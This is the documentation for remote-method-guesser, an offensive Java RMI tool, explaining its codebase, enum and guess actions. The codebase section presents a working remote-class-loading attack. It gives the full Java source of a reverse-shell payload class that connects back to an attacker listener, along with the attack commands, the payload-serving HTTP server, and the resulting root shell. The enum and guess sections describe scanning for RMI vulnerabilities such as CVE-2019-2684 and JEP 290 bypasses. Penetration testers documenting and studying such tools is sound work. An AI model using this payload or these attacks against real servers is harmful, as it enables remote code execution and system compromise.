### Actions

----

In this document you can find additional information for some of *remote-method-guesser's* actions.

* [codebase](#codebase-action)
* [enum](#enum-action)
* [guess](#guess-action)


### Codebase Action

------

In 2011, many *Java RMI* endpoints were vulnerable to *remote class loading* attacks due to an insecure by default configuration within *Java RMI*.
This configurations allowed remote clients to specify a *codebase* that was used by the server to fetch unknown classes during runtime. By sending a custom class,
that is not known by the server, during *RMI* calls and setting the *codebase* to an attacker controlled *HTTP* server, it was possible to get reliable *remote code execution*
on most *Java RMI* endpoints.

Despite being fixed in the default configuration, this vulnerability can still be present if an application server sets the ``useCodebaseOnly`` option to ``false``
and uses a *SecurityManager* with a lax configured security policy. Unfortunately, the current tool landscape for *Java RMI* does not include reliable checks for
this vulnerability. Most tools focus on the *Distributed Garbage Collector*, which is not ideal for the following reasons:

1. The *Distributed Garbage Collector* sets the ``useCodebaseOnly`` property explicitly to ``true`` within the
   ``UnicastServerRef.java`` class. This overwrites custom configurations and always disables *remote class loading* for all calls to the *DGC*.

2. *RMI calls* to the *Distributed Garbage Collector* are handled within a separate ``AccessControlContext``, which denies all outbound connections. This
   ``AccessControlContext`` (defined in ``DGCImpl.java``) overwrites the current security policy and ignores user defined policy rules.

3. Even without the two restrictions mentioned above, *remote class loading* would still fail. The idea of class loading is to send an object of a custom class
   (unknown to the remote server) within *RMI calls*. During a successful attack, the server fetches the class definition from the attacker and calls
   the *readObject* method that contains malicious *Java code*. However, as *internal RMI communication* is nowadays protected by *deserialization filters*, unknown
   classes are rejected while reading the ``ObjectInputStream``. Whereas the *RMI registry* allows unknown classes that implement certain interfaces, the *DGC*
   uses a more strict *deserialization filter* and it is not possible to send unknown classes to it.

For the above mentioned reasons, the *Distributed Garbage Collector* is no longer suitable for enumerating *remote class loading*. It can be used to detect whether a
*Security Manager* is used, but that is only one of the mandatory conditions for being vulnerable to codebase attacks. A little bit better is the
situation for the *RMI registry*. The *RMI registry* still respects a user defined ``useCodebaseOnly`` setting and uses a *SecurityManager* that allows outbound
connections by default. Therefore, a setting of ``useCodebaseonly=false`` is already sufficient to load classes from remote. However, there are two downsides:

1. If no user defined *SecurityManager* with corresponding permissions is present, the loaded remote classes are affected by the security policy of the
   *RMI registry*. As this policy is only concerned about networking, *file* and *process* access might be limited.

2. To trigger *remote class loading* it is required to enforce a ``readObject`` call on the *RMI registry*. Before June 2020, this was easy, as the ``String``
   argument of the ``lookup(String name)`` method was unmarshalled via ``readObject``. However, on most recent *RMI registries* you can only use the ``bind``
   and ``rebind`` methods, that can only be invoked from localhost.

3. The *RMI registry* uses an security manager by default only in it's default implementation. When the *RMI registry* is created manually, no security manager
   is created by default.

Whereas the *internal RMI communications* (*DGC* and *RMI registry*) are well protected, *RMI communication* on the application level is not. A server configured
with ``useCodebaseonly=false`` and a lax configured *SecurityManager* might be exploitable, but you need to know a valid method signature. Furthermore, also
on the application level it is required that the *remote method* leads to a call to ``readObject`` on the server side. Therefore, the targeted remote method
needs non primitive input parameters. As in case of the registry, ``java.lang.String`` might be sufficient for older *RMI servers*, whereas it does not work for
newer ones. The following listing shows an example for a successful codebase attack:

```console
[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Shell http://172.17.0.1:8000 --signature 'String login(java.util.HashMap dummy1)' --bound-name legacy-service
[+] Attempting codebase attack on RMI endpoint...
[+] Using class Shell with codebase http://172.17.0.1:8000/ during login call.
[+]
[+] 	Using non primitive argument type java.util.HashMap on position 0
[+] 	Specified method signature is String login(java.util.HashMap dummy1)
[+]
```

When used against a vulnerable endpoint, you should obtain an *HTTP* request for the specified class:

```console
[qtc@devbox www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [01/Dec/2021 07:36:10] "GET /Shell.class HTTP/1.1" 200 -
```

*remote-method-guesser* expects the payload class to have a ``serialVersionUID`` of ``2L``, but apart from that you can do anything
within the ``readObject`` method of the class. For this demonstration, the following class definition was used, that spawns a reverse shell:

```java
// Taken from: https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.jar.Attributes;
import java.io.Serializable;
import java.io.ObjectInputStream;
import java.rmi.Remote;

public class Shell implements Serializable, Remote
{
    private static int port = 4444;
    private static String cmd = "/bin/ash";
    private static String host = "172.17.0.1";
    private static final long serialVersionUID = 2L;

    private void readObject(ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, Exception
    {
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host,port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while(!s.isClosed()) {

            while(pi.available()>0)
                so.write(pi.read());

            while(pe.available()>0)
                so.write(pe.read());

            while(si.available()>0)
                po.write(si.read());

            so.flush();
            po.flush();
            Thread.sleep(50);

            try {
                p.exitValue();
                break;
            } catch (Exception e){}
        }

        p.destroy();
        s.close();
    }
}
```

After the class was loaded by the vulnerable endpoint, a shell pops up on the corresponding listener:

```console
[qtc@devbox ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:36222.
id
uid=0(root) gid=0(root) groups=0(root)
```

As previously mentioned, the internal *RMI communication* of modern *RMI endpoints* is hardened against *codebase* and *deserialization attacks*.
Nonetheless, *remote-method-guesser* also supports *codebase attacks* on the *DGC* and *RMI registry* level and allows you to verify the
vulnerability on older *RMI endpoints*. In case of the *RMI registry*, it turns out that class loading is even possible on fully patched
endpoints, if the ``useCodebaseOnly`` property is set to ``false`` and the *SecurityManager* allows the requested action of the payload class.

However, notice that in this case the payload class needs to extend or implement an (interface) class that is explicitly allowed
by the deserialization filters of the *RMI registry*. This is why the above mentioned payload class needs to implement ``java.rmi.Remote``.
Without implementing this interface, the class would have been rejected by the *RMI registry*.

```console
[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Shell http://172.17.0.1:8000 --component reg
[+] Attempting codebase attack on RMI Registry endpoint...
[+] Using class Shell with codebase http://172.17.0.1:8000/ during lookup call.

[qtc@devbox www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [01/Dec/2021 07:38:04] "GET /Shell.class HTTP/1.1" 200 -

[qtc@devbox ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:36242.
id
uid=0(root) gid=0(root) groups=0(root)
```


### Enum Action

------

In this section, the different checks of the ``enum`` action and it's outputs are explained in more detail:


#### Bound Name Enumeration

The bound name enumeration should be self explanatory. In this check *remote-method-guesser* simply obtains a
list of bound names registered on an *RMI registry*. Additionally, each bound name is queried once to obtain the
class or interface name that is used when dispatching calls to the corresponding bound name. Obtained class names
are printed and marked as either *known* or *unknown*. *remote-method-guesser* contains a database of known *RMI*
classes. These are classes that have been encountered before and for which certain meta information is available.
Corresponding class names can be used in *remote-method-guesser's* ``known`` action to view the stored meta information:

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | head -n 6
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: iinsecure.dev:42222 ObjID: [6633018:17cb5d1bb57:-7ff8, -8114172517417646722]
[+]
[qtc@devbox ~]$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
[+] Name:
[+] 	JMX Server
[+]
[+] Class Name:
[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
[+] 	- javax.management.remote.rmi.RMIServer
[+]
[+] Description:
[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
[+]
[+] Remote Methods:
[+] 	- String getVersion()
[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
[+]
[+] References:
[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
[+]
[+] Vulnerabilities:
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		MLet
[+]
[+] 	Description:
[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
[+] 		is therefore most of the time equivalent to remote code execution.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		Deserialization
[+]
[+] 	Description:
[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
[+] 		establish a working JMX connection, you can also perform deserialization attacks.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshoote
```

Apart from the bound names and the class information, *remote-method-guesser* displays information on the remote
objects ``ObjID`` and the corresponding *RMI endpoint* the bound name is referring to.


#### Codebase Enumeration

Apart from client specified codebases explained above, *RMI* servers can also expose a codebase to download class
definitions dynamically. The idea is basically that it enables client's to call remote methods without having all
required class definitions within their own class path. Imagine a method like ``ServerManager getServerManager()``,
where the ``ServerManager`` class is implemented by the server, but is not known to the client. Calling this method
without a server exposed codebase would lead to a ``ClassNotFoundException``, as the class definition is not known
on the client side. With a server exposed codebase, the client could enable remote class loading (``useCodebaseOnly=false``)
and the *RMI* internals would download the class from the server specified codebase during the method call.

As with client specified codebases, remote class loading is always a security risk and ``UseCodebaseOnly`` is set to
``true`` by default. Due to the implied security risks, this concept is generally not often used in practice. When
developing applications that use *Java RMI* for client-server communication, you usually already compile all required classes
and interface definitions into the client. Exposing a server-side codebase is therefore usually not required.

*remote-method-guesser* looks out for these server-side specified codebase definitions anyway. During a black box security assessment,
encountering a  ``HTTP`` based server-side codebase can be huge deal. It may allows you to download class definitions
that expose information about the *RMI* endpoint. Sometimes you also find codebases that rely on the ``file`` protocol.
While not being that useful without server access, a ``file`` based codebase still reveals internal paths that could
be useful for other attacks as well.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | rg "RMI server codebase" -A 3 
[+] RMI server codebase enumeration:
[+]
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+]
```


#### String Marshalling

When dispatching *RMI calls*, the *RMI server* uses different methods to unmarshal the client specified arguments.
*Primitive types* like ``int`` are marshalled via their corresponding *read-method* like e.g. ``readInt``. Non
primitive types are usually unmarshalled via ``readObject``, that can be used for certain types of attacks.

In *June 2020*, the unmarshalling behavior of the ``String`` type [was changed](https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/).
Instead of unmarshalling ``String`` via ``readObject``, the ``String`` type is now read via ``readString`` on modern
*RMI* endpoints. This prevents certain attack types on remote methods that only accept ``String`` typed arguments.

*remote-method-guesser* is capable of enumerating the corresponding unmarshalling behavior and returns one of the following
outputs during its enumeration:

* **Current Default**: The ``String`` type is unmarshalled via ``readString``.
* **Outdated**: The ``String`` type is unmarshalled via ``readObject``, which usually means that the corresponding
  *RMI endpoint* is out of date.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action string-marshalling 
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Caught ClassNotFoundException during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 	  Configuration Status: Outdated
```


#### useCodebaseOnly Enumeration

The *useCodebaseOnly enumeration* attempts to detect the servers setting on the ``useCodebaseOnly`` attribute. The impact
of this attribute was already explained within the [codebase action](#codebase-action) section. The enumeration can return
one of the following results:

* **Current Default**: The *RMI* server runs with ``useCodebaseOnly=true``
* **Non Default**: The *RMI* server runs with ``useCodebaseOnly=false``

Notice that the second status was intentionally not named **Vulnerable**, as the actual exploitability depends on the settings
of the ``SecurityManager``. Please refer to the [codebase action](#codebase-action) section for more details.

The codebase enumeration is implemented by sending a malformed *URL* as client side codebase during *RMI calls*. When
*useCodebaseOnly* is set to *false* (and a *SecurityManager* is present), the server attempts to parse the malformed *URL*
and throws a corresponding exception. This makes the codebase enumeration very reliable.

Codebase enumeration is only supported for registry endpoints, since the *DGC* is not suitable for an reliable enumeration
(see [codebase action](#codebase-action)). Furthermore, the ``String`` type needs to be unmarshalled via ``readObject``.
If this is not the case, you can still enumerate the *useCodebaseOnly* setting from localhost *RMI endpoints* by using a different
method than ``lookup`` in the ``--registry-method`` option.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action codebase 
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 	  Configuration Status: Non Default
```


#### CVE-2019-2684 Enumeration

During bind operations, the *RMI registry* verifies that incoming connections are performed from localhost, which is the only
requirement on the client. Other authentication mechanisms are not in place within the default registry implementation.
``CVE-2019-2684`` was a vulnerability within the default *RMI registry* implementation that let remote users *bind*, *rebind* and
*unbind* objects from the registry endpoint. During it's ``enum`` action, *rmg* can detect this vulnerability and responds with
either of the following:

* **Non Vulnerable**: The vulnerability is patched.
* **Vulnerable**: The server is vulnerable (can be confirmed by using e.g. *rmg's* ``bind`` action.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action localhost-bypass 
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
[+] 	  Vulnerability Status: Vulnerable
```


#### Security Manager Enumeration

The *security manager enumeration* is what other *RMI tools* do during their *codebase* enumeration. It uses calls to the
*Distributed Garbage Collector* to verify whether a security manager is present on the server side.

* **Current Default**: Is displayed when the enumeration is successful, independent of the result (*SecurityManager* present or not).
  Whether a *SecurityManager* is present can be read from the status message.
* **Outdated**: During the *DGC* call that enumerates the *SecurityManager* setting, a malformed client side codebase is used. 
  As explained in the [codebase-action](#codebase-action) section, this is usually pointless, but for very old *DGC* instances
  it can still work. The *DGC* when attempts to parse the malformed codebase and throws an exception. The endpoint is marked
  as **Outdated** in this case.


```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action security-manager 
[+] RMI Security Manager enumeration:
[+]
[+] 	- Security Manager rejected access to the class loader.
[+] 	  --> The server does use a Security Manager.
[+] 	  Configuration Status: Current Default
```


#### JEP 290 Enumeration

The *JEP 290 enumeration* checks for the *deserialization filters* on the *RMI endpoint*. It sends a ``java.util.HashMap`` object
to the *DGC* and inspects the returned exception message. The corresponding result can be one of the following:

* **Non Vulnerable**: *JEP 290* is installed and the *DGC* rejected the deserialization.
* **Vulnerable**: The ``java.util.HashMap`` object was deserialized and the endpoint is vulnerable to deserialization attacks.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action jep290 
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
```


#### JEP 290 Bypass Enumeration

There are currently two well known bypasses for the *RMI registry* deserialization filters. One is the *JRMPClient* gadget of ``ysoserial``
and the other was identified by [An Trinh](https://twitter.com/_tint0) and is explained in great detail in [this blog post](https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/).
Both bypasses are patched on modern *RMI registry* endpoints. During it's enumeration, *rmg* uses the *An Trinh* gadget (as it is newer)
with an invalid set of arguments. Depending on the corresponding exception message, the result status is:

* **Non Vulnerable**: The bypass was patched and the gadget is not working.
* **Vulnerable**: The registry deserialization filters can be bypassed using the *An Trinh* gadget.

Notice that for this enumeration technique to work from remote, the *RMI registry* must use ``readObject`` to unmarshal the ``String`` type.
From localhost, you can also enumerate servers that use ``readString``, by using e.g. the ``--reg-method bind`` option.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action filter-bypass 
[+] RMI registry JEP290 bypass enmeration:
[+]
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerabl
```


#### Activation System Enumeration

The *Activation System* and it's possible attack vectors are explained in great detail in the [activator action](#activator-action) section.
This enumeration tells you whether an activator instance is available on the targeted *RMI registry*. The result is either:

* **Current Default**: No activator object is present.
* **Vulnerable**: An activator is present and allows deserialization and probably codebase attacks.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action activator 
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught IllegalArgumentException during activate call (activator is present).
[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
```


### Guess Action

------

When using the ``guess`` operation, *rmg* attempts to identify existing remote methods by sending method hashes
to the remote server. This operation requires a wordlist that contains the corresponding method definitions in the
following form:

```console
[qtc@kali wordlists]$ head -n 5 /opt/remote-method-guesser/wordlists/rmg.txt
boolean call(String dummy, String dummy2, String dummy3)
boolean call(String dummy, String dummy2)
boolean call(String dummy, String[] dummy2)
boolean call(String dummy)
boolean call(String[] dummy)
```

*remote-method-guesser* ships some default wordlists and expects them in the path ``/opt/remote-method-guesser/wordlists/``.
You can change this path either by modifying the [rmg configuration file](./src/config.properties) or by using the ``--wordlist-file``
or ``--wordlist-folder`` options. Methods with zero arguments are skipped by default. You can enable them by using the
``--zero-arg`` option. However, keep in mind that zero argument methods lead to real method calls on the server side, as their
invocation cannot be prevented by using invalid argument types.

```console
[qtc@devbox ~]$ rmg guess 172.17.0.2 1090 --ssl --zero-arg 
[+] Reading method candidates from internal wordlist rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3294 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server  ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[ plain-server  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ ssl-server    ] HIT! Method with signature String system(String[] dummy) exists!
[+] 		[ ssl-server    ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		[ ssl-server    ] HIT! Method with signature int execute(String dummy) exists!
[+] 		[ secure-server ] HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
[+] 		[ secure-server ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[ secure-server ] HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
[+] 		[9882 / 9882] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 	- ssl-server
[+] 		--> String system(String[] dummy)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 		--> int execute(String dummy)
[+] 	- secure-server
[+] 		--> void logMessage(int dummy1, Object dummy2)
[+] 		--> String login(java.util.HashMap dummy1)
[+] 		--> void updatePreferences(java.util.ArrayList dummy1)
```

To reduce the overhead of dynamic class generation, *rmg* also supports an optimized wordlist format that
contains the pre-computed method hashes and some meta information about the methods.

```console
[qtc@kali wordlists]$ head -n 5 rmg.txt 
boolean call(String dummy, String dummy2, String dummy3); 2142673766403641873; false; false
boolean call(String dummy, String dummy2); -9048491806834107285; false; false
boolean call(String dummy, String[] dummy2); 7952470873340381142; false; false
boolean call(String dummy); -5603201874062960450; false; false
boolean call(String[] dummy); -4301784332653484516; false; false
```

To transform a plain wordlist file into the optimized format, just use the ``--update`` option during the ``guess``
operation. This will update all currently used wordlist files to the optimized format.
